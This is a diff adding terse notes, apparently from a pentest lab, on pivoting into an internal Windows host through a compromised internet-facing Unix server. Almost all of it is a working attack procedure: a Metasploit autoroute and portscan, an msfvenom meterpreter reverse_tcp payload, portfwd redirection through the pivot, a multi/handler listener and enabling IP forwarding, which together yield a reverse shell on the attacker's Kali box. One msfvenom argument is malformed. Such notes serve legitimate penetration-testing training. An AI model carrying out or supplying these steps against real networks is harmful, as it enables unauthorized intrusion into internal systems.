@@ -1,0 +1,47 @@
+- the usercase uses an attacker (Kali) machine, a machine exposed to the internet and an internal Windows box not pingable from the internet.
+- we will do the reverse shell from the Windows box to the Unix machine on the internet, machine of 10.10.10.5
+- the Windows machine will connect to 10.10.10.5 on port 6666
+- the internet exposed server will reverse shell on port 1337 to the attacker system.
+- so when the Windows system reverse shell on port 6666 it will get redirected on port 1337 back to the attacker(Kali).
+
+1) get a reverse shell from the UNIX box exposed to the internet with IP - 10.10.10.5
+search autoroute
+post/multi/manage/autoroute
+use 0
+(0 stands for the only option found with 'search autoroute')
+set session 2
+set SUBNET 10.10.10.0
+run
+route
+(we should see the route added)
+
+search portscan
+use 5
+
+create payload:
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT 6666 -f exe -o payload.exe
+
+sessions -i 2
+portfwd -h
+portfwd add -R -L windowsServer -l 1337 -p 6666
+
+use exploit/multi/handler
+set LHOST windowsServer
+set LPORT 1337
+show options
+run
+
+Unix server configuration for IP forwarding:
+nano /proc/sys/net/ipv4/ip_forward (change from 0 to 1)
+(close)
+netstat -ant | grep 6666
+(you should see that the port is listening)
+
+(on the Windows box run the payload.exe which you would have moved over to it, and back on the attacker Kali box, you should get a reverse shell on port 1337).
+
+
+
+
+
+
+
